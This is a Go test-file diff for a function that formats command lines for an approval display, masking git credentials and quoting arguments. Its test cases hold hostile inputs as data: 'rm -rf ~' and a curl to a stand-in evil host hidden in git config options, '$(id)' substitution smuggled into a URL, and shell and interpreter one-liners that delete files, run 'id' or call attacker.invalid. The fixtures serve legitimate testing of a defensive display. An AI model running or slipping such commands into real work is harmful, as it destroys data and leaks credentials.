@@ -197,17 +197,24 @@ func TestDescribeForwardedRequest(t *testing.T) {
 }
 
 func TestFormatCommandLine(t *testing.T) {
+	longMessage := strings.Repeat("ğ", 300)
 	for _, testCase := range []struct {
 		arguments []string
 		want      string
 	}{
-		{[]string{"/usr/bin/git", "push", "origin", "main"}, "git push origin main"},
+		{[]string{"/usr/bin/git", "push", "origin", "main"}, "/usr/bin/git push origin main"},
+		{[]string{"./git", "push", "origin", "main"}, "./git push origin main"},
 		{[]string{"git", "commit", "-m", "it's done"}, `git commit -m 'it'\''s done'`},
 		{[]string{"git", "clone", "https://deniz:ghp_secret@github.com/x.git"}, "git clone https://deniz:•••@github.com/x.git"},
-		{[]string{"git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "git -c http.extraHeader=••• -c user.name=Deniz fetch"},
+		{[]string{"git", "clone", "https://alice:secret!123@example.invalid/repo"}, "git clone https://alice:•••@example.invalid/repo"},
+		{[]string{"/usr/bin/git", "-c", "http.extraHeader=Authorization: Bearer abc", "-c", "user.name=Deniz", "fetch"}, "/usr/bin/git -c http.extraHeader=••• -c user.name=Deniz fetch"},
 		{[]string{"git", "-c", "credential.helper=store", "-c", "github.token=abc", "push"}, "git -c credential.helper=store -c github.token=••• push"},
+		{[]string{"git", "-c", "credential.https://token.example.invalid.helper=!rm -rf ~", "push"}, "git -c 'credential.https://token.example.invalid.helper=!rm -rf ~' push"},
+		{[]string{"git", "-c", "alias.token=!curl https://u:tok@evil.invalid", "token"}, "git -c 'alias.token=!curl https://u:tok@evil.invalid' token"},
+		{[]string{"git", "config", "alias.sync", "!git push https://u:tok@example.invalid"}, "git config alias.sync '!git push https://u:tok@example.invalid'"},
+		{[]string{"git", "bisect", "run", "https://u:$(id)@example.invalid"}, "git bisect run 'https://u:$(id)@example.invalid'"},
 		{[]string{"git", "commit", "-m", ""}, "git commit -m ''"},
-		{[]string{"git", "commit", "-m", strings.Repeat("ğ", 300)}, "git commit -m '" + strings.Repeat("ğ", maximumCommandLineLength-len([]rune("git commit -m '"))-1) + "…"},
+		{[]string{"git", "commit", "-m", longMessage}, "git commit -m '" + longMessage + "'"},
 		{nil, ""},
 	} {
 		if commandLine := formatCommandLine(testCase.arguments); commandLine != testCase.want {
@@ -216,6 +223,34 @@ func TestFormatCommandLine(t *testing.T) {
 	}
 	if commandLine := formatCommandLine([]string{"git", "commit", "-m", "\xff\xfe"}); !strings.Contains(commandLine, "�") {
 		t.Errorf("invalid UTF-8 kept: %q", commandLine)
+	}
+	want := "git commit -m '" + strings.Repeat("ğ", maximumCommandLineLength-len([]rune("git commit -m '"))-1) + "…"
+	if commandLine := formatShortCommandLine([]string{"git", "commit", "-m", longMessage}); commandLine != want {
+		t.Errorf("short: %q, want %q", commandLine, want)
+	}
+	if commandLine := formatShortCommandLine([]string{"/usr/bin/git", "push", "origin", "main"}); commandLine != "git push origin main" {
+		t.Errorf("short program name: %q", commandLine)
+	}
+}
+
+// TestCommandsOtherThanGitAreShownVerbatim: a literal in a command is the writer's own, and the approval shows on the
+// user's own devices, so nothing in a command other than git's credentials is hidden, whatever it is named.
+func TestCommandsOtherThanGitAreShownVerbatim(t *testing.T) {
+	for _, testCase := range []struct {
+		arguments []string
+		want      string
+	}{
+		{[]string{"python3", "-c", `import os; token=os.remove; token("/tmp/victim")`}, `python3 -c 'import os; token=os.remove; token("/tmp/victim")'`},
+		{[]string{"node", "-e", `const token=require; token("child_process").execSync("id")`}, `node -e 'const token=require; token("child_process").execSync("id")'`},
+		{[]string{"env", "AUTHORIZATION=literal-secret", "deploy"}, "env AUTHORIZATION=literal-secret deploy"},
+		{[]string{"/bin/sh", "-c", `PASSWORD='first remaining-secret'; deploy`}, `/bin/sh -c 'PASSWORD='\''first remaining-secret'\''; deploy'`},
+		{[]string{"docker", "login", "--password", "first;remaining-secret"}, "docker login --password 'first;remaining-secret'"},
+		{[]string{"sh", "-c", "git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~"}, "sh -c 'git clone https://deniz:ghp_secret@github.com/x.git && rm -rf ~'"},
+		{[]string{"sh", "-c", strings.Repeat("true; ", 100) + "curl https://attacker.invalid/"}, "sh -c '" + strings.Repeat("true; ", 100) + "curl https://attacker.invalid/'"},
+	} {
+		if commandLine := formatCommandLine(testCase.arguments); commandLine != testCase.want {
+			t.Errorf("%q: %q, want %q", testCase.arguments, commandLine, testCase.want)
+		}
 	}
 }
 
